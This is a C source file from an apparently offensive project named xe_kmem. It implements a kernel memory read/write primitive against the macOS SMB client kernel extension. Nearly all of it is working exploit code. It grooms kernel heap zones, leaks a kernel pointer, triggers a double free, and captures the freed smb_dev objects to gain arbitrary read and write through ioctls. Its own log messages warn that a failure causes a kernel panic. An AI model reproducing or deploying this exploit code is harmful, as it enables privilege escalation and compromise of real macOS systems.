//
//  smb_dev_rw.c
//  xe_kmem
//
//  Created by admin on 2/22/22.
//

#include <assert.h>
#include <arpa/inet.h>

#include <dispatch/dispatch.h>

#include <xe/util/log.h>
#include <xe/util/assert.h>

#include "memory/allocator_rw.h"
#include "memory/allocator_nrnw.h"
#include "memory/zkext_alloc_small.h"
#include "memory/zkext_free.h"
#include "smb/client.h"
#include "smb/params.h"

#include "smb_dev_rw.h"

static_assert(sizeof(struct smb_dev) == 48, "");

#define NUM_KEXT_32_FRAGMENTED_PAGES    1024
#define MAX_SOCK_ADDR_ENTRY_ALLOC_TRIES 100
#define MAX_SOCK_ADDR_ALLOC_TRIES       100

#define NUM_DBF_CAPTURE_ALLOCS       256
#define NUM_SMB_DEV_CAPTURE_ALLOCS   512


#define NSMBFL_CPN_CAPTURE (1 << 31)
#define NSMBFS_SPN_CAPTURE (1 << 30)


static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
    .sin6_len = sizeof(struct sockaddr_in6),
    .sin6_family = AF_INET6,
    .sin6_port = 1234
};


struct smb_dev_capture {
    int fd_dev;
    int fd_rw;
    _Bool rw_data1;
    _Bool active;
};


struct smb_dev_rw {
    kmem_zkext_free_session_t dbf_session;
    struct sockaddr_in smb_addr;
    struct smb_dev_capture capture1;
    struct smb_dev_capture capture2;
};


struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 48, AF_INET, NULL, 0);
        uintptr_t addr = entry.address;
        uint8_t sa_len = (uint8_t)addr;
        uint8_t sa_family = (uint8_t)(addr >> 8);
        if (sa_len == 48 && sa_family != AF_INET && sa_family != AF_INET6) {
            return entry;
        } else {
            kmem_allocator_nrnw_allocate(nrnw_allocator, 48, random() % 128);
            kmem_allocator_prpw_destroy(&entry.element_allocator);
        }
    }
    xe_log_error("failed to allocate kext.48 element having address ending with 48");
    abort();
}


struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr_entry(const struct sockaddr_in* smb_addr, uintptr_t sock_addr, uintptr_t tqe_prev) {
    uint8_t sa_len = (uint8_t)sock_addr;
    xe_assert(sa_len == 48);
    uint8_t sa_family = (uint8_t)(sock_addr >> 8);
    xe_assert(sa_family != AF_INET && sa_family != AF_INET6);
    
    struct sock_addr_entry entry;
    entry.addr = (struct sockaddr*)sock_addr;
    entry.next.tqe_next = 0;
    entry.next.tqe_prev = (struct sock_addr_entry**)tqe_prev;
    
    for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
        struct kmem_zkext_alloc_small_entry alloc = kmem_zkext_alloc_small(smb_addr, sa_len, sa_family, (char*)&entry + 2, sizeof(entry) - 2);
        uintptr_t allocated_address = alloc.address;
        if (allocated_address % 32 == 0) {
            kmem_allocator_prpw_destroy(&alloc.element_allocator);
        } else {
            return alloc;
        }
    }
    xe_log_error("failed to allocate sock_addr");
    abort();
}


void smb_dev_rw_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
    kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
    for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
        kmem_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
        kmem_allocator_nrnw_allocate(gap_allocator, 32, (XE_PAGE_SIZE / 32) - 2);
    }
    kmem_allocator_nrnw_destroy(&gap_allocator);
}


int smb_dev_rw_capture_with_smb_dev(kmem_allocator_prpw_t element_allocator, int64_t found_idx, kmem_allocator_rw_t capture_allocator, struct smb_dev_capture* capture) {
    xe_assert(found_idx >= 0);
    
    int* capture_smb_devs = alloca(sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
    memset(capture_smb_devs, -1, sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
    
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (idx == 32) {
            int error = kmem_allocator_prpw_release_containing_backend(element_allocator, found_idx);
            xe_assert_err(error);
        }
        capture_smb_devs[idx] = smb_client_open_dev();
        xe_assert(capture_smb_devs[idx] >= 0);
    });
    
    int64_t capture_idx = -1;
    int error = kmem_allocator_rw_filter(capture_allocator, 0, kmem_allocator_rw_get_backend_count(capture_allocator), 48, 0, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        if (memcmp(data1, &SMB_DEV_CAPTURE_DATA, sizeof(SMB_DEV_CAPTURE_DATA)) != 0) {
            capture->rw_data1 = TRUE;
            return TRUE;
        }
        return FALSE;
    }, NULL, &capture_idx);
    xe_assert_err(error);
    
    if (capture_idx < 0) {
        capture->active = FALSE;
        capture->fd_dev = -1;
        capture->fd_rw = -1;
        return EIO;
    }
    
    capture->fd_rw = kmem_allocator_rw_disown_backend(capture_allocator, (int)capture_idx);
    
    for (int i=0; i<NUM_SMB_DEV_CAPTURE_ALLOCS; i++) {
        int error = smb_client_ioc_cancel_session(capture_smb_devs[i]);
        xe_assert_err(error);
        
        struct smb_dev dev;
        
        uint32_t gss_cpn_size = capture->rw_data1 ? 48 : UINT32_MAX;
        uint32_t gss_spn_size = capture->rw_data1 ? UINT32_MAX : 48;
        
        error = smb_client_ioc_auth_info(capture->fd_rw, (char*)&dev, gss_cpn_size, (char*)&dev, gss_spn_size, NULL);
        xe_assert_err(error);
        
        if (dev.sd_flags & NSMBFL_CANCEL) {
            capture->fd_dev = capture_smb_devs[i];
            capture_smb_devs[i] = -1;
            break;
        }
    }
    
    xe_assert(capture->fd_dev >= 0);
    
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        int fd = capture_smb_devs[idx];
        if (fd >= 0) {
            close(fd);
        }
    });
    
    xe_assert(capture->fd_rw >= 0);
    xe_assert(capture->fd_dev >= 0);
    capture->active = TRUE;
    return 0;
}


smb_dev_rw_t smb_dev_rw_create(const struct sockaddr_in* smb_addr) {
    kmem_allocator_nrnw_t nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
    smb_dev_rw_fragment_kext_32(smb_addr, nrnw_allocator);
    
    struct kmem_zkext_alloc_small_entry saddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
    uintptr_t saddr_addr = saddr_alloc.address;
    xe_log_debug("allocated socket_address at %p", (void*)saddr_addr);
    
    kmem_zkext_free_session_t dbf_session = kmem_zkext_free_session_create(smb_addr);
    struct complete_nic_info_entry dbf_nic = kmem_zkext_free_session_prepare(dbf_session);
    uintptr_t dbf_nic_addr = ((uintptr_t)dbf_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections));
    xe_log_debug("leaked nic at %p", (void*)dbf_nic_addr);
    
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 32);
    
    struct kmem_zkext_alloc_small_entry saddr_entry_alloc = smb_dev_rw_alloc_sock_addr_entry(smb_addr, saddr_addr, dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first));
    uintptr_t saddr_entry_addr = saddr_entry_alloc.address;
    xe_log_debug("allocated sock_addr_entry at %p", (void*)saddr_entry_addr);
    
    kmem_allocator_rw_t capture_allocator = kmem_allocator_rw_create(smb_addr, NUM_DBF_CAPTURE_ALLOCS);
    
    dbf_nic.next.next = NULL;
    dbf_nic.addr_list.tqh_first = (struct sock_addr_entry*)saddr_entry_addr;
    dbf_nic.addr_list.tqh_last = 0;
    
    char* capture_data = alloca(48);
    bzero(capture_data, 48);
    memcpy(capture_data, &SMB_DEV_CAPTURE_DATA, sizeof(SMB_DEV_CAPTURE_DATA));
    
    xe_log_debug("begin double free");
    kmem_zkext_free_session_execute(dbf_session, &dbf_nic);
    int error = kmem_allocator_rw_allocate(capture_allocator, NUM_DBF_CAPTURE_ALLOCS, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
        *data1 = capture_data;
        *data1_size = 48;
        *data2 = NULL;
        *data2_size = 0;
    }, NULL);
    xe_assert_err(error);
    xe_log_debug("double free complete");
    
    kmem_allocator_prpw_data_filter filter = ^_Bool(void* ctx, sa_family_t address_family, size_t idx) {
        return address_family == AF_INET6;
    };
    
    int64_t saddr_found_index = -1;
    error = kmem_allocator_prpw_filter(saddr_alloc.element_allocator, 0, kmem_allocator_prpw_get_capacity(saddr_alloc.element_allocator), filter, NULL, &saddr_found_index);
    xe_assert_err(error);
    
    int64_t saddr_entry_found_index = -1;
    error = kmem_allocator_prpw_filter(saddr_entry_alloc.element_allocator, 0, kmem_allocator_prpw_get_capacity(saddr_entry_alloc.element_allocator), filter, NULL, &saddr_entry_found_index);
    xe_assert_err(error);
    
    if (saddr_entry_found_index < 0 && saddr_found_index < 0) {
        xe_log_error("failed to capture both kext.48 allocs using rw allocator");
        getpass("[INFO] press enter to continue. THIS WILL CAUSE KERNEL PANIC\n");
        abort();
    } else if (saddr_entry_found_index < 0) {
        xe_log_warn("failed to capture saddr_entry using rw allocator");
    } else if (saddr_found_index < 0) {
        xe_log_warn("failed to capture saddr using rw allocator");
    }
    
    struct smb_dev_capture capture1 = { .active = FALSE };
    if (saddr_entry_found_index >= 0) {
        xe_log_debug("capturing sock_addr_entry with smb_dev");
        smb_dev_rw_capture_with_smb_dev(saddr_entry_alloc.element_allocator, saddr_entry_found_index, capture_allocator, &capture1);
    }
    
    struct smb_dev_capture capture2 = { .active = FALSE };
    if (saddr_found_index >= 0) {
        xe_log_debug("capturing sock_addr with smb_dev");
         smb_dev_rw_capture_with_smb_dev(saddr_alloc.element_allocator, saddr_found_index, capture_allocator, &capture2);
    }
    
    if (!capture1.active && !capture2.active) {
        xe_log_error("failed to capture both kext.48 with smb_dev");
        getpass("[INFO] press enter to continue. THIS WILL CAUSE KERNEL PANIC");
        abort();
    } else if (!capture1.active) {
        xe_log_warn("failed to capture saddr_entry using smb_dev");
    } else if (!capture2.active) {
        xe_log_warn("failed to capture saddr with smb_dev");
    }
    
    xe_log_debug("all done");
    
    kmem_allocator_rw_destroy(&capture_allocator);
    kmem_allocator_prpw_destroy(&saddr_entry_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&saddr_alloc.element_allocator);
    kmem_allocator_nrnw_destroy(&nrnw_allocator);
    
    smb_dev_rw_t dev_rw = malloc(sizeof(struct smb_dev_rw));
    dev_rw->smb_addr = *smb_addr;
    dev_rw->dbf_session = dbf_session;
    dev_rw->capture1 = capture1;
    dev_rw->capture2 = capture2;
    
    return dev_rw;
}

void smb_dev_rw_read_data(const struct smb_dev_capture* capture, struct smb_dev* out) {
    uint32_t cpn_len = capture->rw_data1 ? 48 : UINT32_MAX;
    uint32_t spn_len = capture->rw_data1 ? UINT32_MAX : 48;
    
    int error = smb_client_ioc_auth_info(capture->fd_rw, (char*)out, cpn_len, (char*)out, spn_len, NULL);
    xe_assert_err(error);
}

int smb_dev_rw_write_data(const struct sockaddr_in* smb_addr, struct smb_dev_capture* capture, struct smb_dev* data) {
    data->sd_flags &= ~NSMBFL_CANCEL;
    
    xe_log_debug_hexdump(data, sizeof(*data), "writing smb_dev at %d with:", capture->fd_dev);
    
    kmem_allocator_rw_t capture_allocator = kmem_allocator_rw_create(smb_addr, NUM_SMB_DEV_CAPTURE_ALLOCS / 2);
    close(capture->fd_rw);
    
    int error = kmem_allocator_rw_allocate(capture_allocator, NUM_SMB_DEV_CAPTURE_ALLOCS / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t idx) {
        *data1 = (char*)data;
        *data1_size = 48;
        *data2 = (char*)data;
        *data2_size = 48;
    }, NULL);
    xe_assert_err(error);
    
    error = smb_client_ioc_cancel_session(capture->fd_dev);
    if (error == EBADF) {
        kmem_allocator_rw_destroy(&capture_allocator);
        return error;
    }
    xe_assert_err(error);
    
    int64_t found_idx;
    error = kmem_allocator_rw_filter(capture_allocator, 0, kmem_allocator_rw_get_backend_count(capture_allocator), 48, 48, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        struct smb_dev* dev1 = (struct smb_dev*)data1;
        struct smb_dev* dev2 = (struct smb_dev*)data2;
        if (dev1->sd_flags & NSMBFL_CANCEL) {
            capture->rw_data1 = TRUE;
            return TRUE;
        }
        if (dev2->sd_flags & NSMBFL_CANCEL) {
            capture->rw_data1 = FALSE;
            return TRUE;
        }
        return FALSE;
    }, NULL, &found_idx);
    
    if (found_idx < 0) {
        capture->active = FALSE;
        capture->fd_rw = -1;
        capture->fd_dev = -1;
        error = EIO;
    } else {
        capture->fd_rw = kmem_allocator_rw_disown_backend(capture_allocator, (int)found_idx);
        error = 0;
    }
    
    kmem_allocator_rw_destroy(&capture_allocator);
    return error;
}

struct smb_dev_capture* smb_dev_rw_get_active_capture(smb_dev_rw_t rw) {
    if (rw->capture1.active) {
        return &rw->capture1;
    } else if (rw->capture2.active) {
        return &rw->capture2;
    } else {
        xe_log_error("not active capture left");
        abort();
    }
}

void smb_dev_rw_read(smb_dev_rw_t rw, struct smb_dev* out) {
    struct smb_dev_capture* capture = smb_dev_rw_get_active_capture(rw);
    smb_dev_rw_read_data(capture, out);
}

void smb_dev_rw_write(smb_dev_rw_t rw, struct smb_dev* dev) {
    struct smb_dev_capture* capture = smb_dev_rw_get_active_capture(rw);
    int error = 0;
    do {
        error = smb_dev_rw_write_data(&rw->smb_addr, capture, dev);
    } while (error);
}

int smb_dev_get_active_dev(smb_dev_rw_t rw) {
    struct smb_dev_capture* capture = smb_dev_rw_get_active_capture(rw);
    return capture->fd_dev;
}

void smb_dev_rw_destroy(smb_dev_rw_t rw) {
    xe_log_error("todo");
    abort();
}
